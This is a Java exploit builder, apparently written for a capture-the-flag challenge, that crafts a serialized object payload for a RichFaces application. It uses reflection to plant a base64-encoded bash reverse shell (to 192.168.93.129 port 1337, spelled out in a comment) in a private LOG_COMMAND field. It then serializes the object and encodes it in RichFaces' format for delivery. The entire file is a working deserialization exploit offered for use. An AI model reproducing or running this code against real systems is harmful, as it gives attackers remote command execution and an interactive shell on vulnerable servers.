import com.tint0.wutfaces.BookHolder;
import org.richfaces.util.Util;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class BuildPayload {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException {
        HashMap map = new HashMap();
        BookHolder bookHolder = new BookHolder();

        map.put(bookHolder, "whatever");

        /*
        After HashMap.put()
        Set value for LOG_COMMAND private field, the value is just a reverse shell encoded using Jackson_T's encoding tool
            rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.93.129 1337 > /tmp/f
        https://www.jackson-t.ca/runtime-exec-payloads.html
         */
        Field field = bookHolder.getClass().getDeclaredField("LOG_COMMAND");
        field.setAccessible(true);
        field.set(bookHolder, "bash -c {echo,cm0gL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgMTkyLjE2OC45My4xMjkgMTMzNyA+IC90bXAvZg==}|{base64,-d}|{bash,-i}");

        /* Serialize object */
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.bin"));
        oos.writeObject(map);
        oos.close();

        /* Read binary data into byte array, encode it using RichFaces's encodedByteData() method */
        byte[] data = Files.readAllBytes(Paths.get("payload.bin"));
        String encodedPayload = Util.encodeBytesData(data);
        System.out.println(encodedPayload);

        /* Write encoded payload to file */
        PrintWriter out = new PrintWriter("encodedPayload.txt");
        out.println(encodedPayload);
        out.close();
    }
}
